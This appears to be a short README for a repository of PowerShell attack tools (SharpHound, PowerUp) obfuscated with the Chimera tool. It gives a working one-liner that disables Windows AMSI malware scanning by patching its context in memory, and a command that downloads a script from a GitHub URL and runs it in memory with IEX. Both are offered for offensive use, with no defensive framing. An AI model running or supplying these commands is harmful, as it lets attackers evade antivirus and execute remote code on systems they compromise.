# A Collection of encoded powershell tools. All encoding done via Chimera

Tools added:
* SharpHound
* PowerUp

# How to

## Disable AMSI

``` pwsh
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if($b.Name -Like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic, Static');Foreach($e in $d) {if($e.Name -Like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Run PowerShell script in memory

``` pwsh
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/OverflowMyBuffers/whatever-script.ps1') | IEX
```
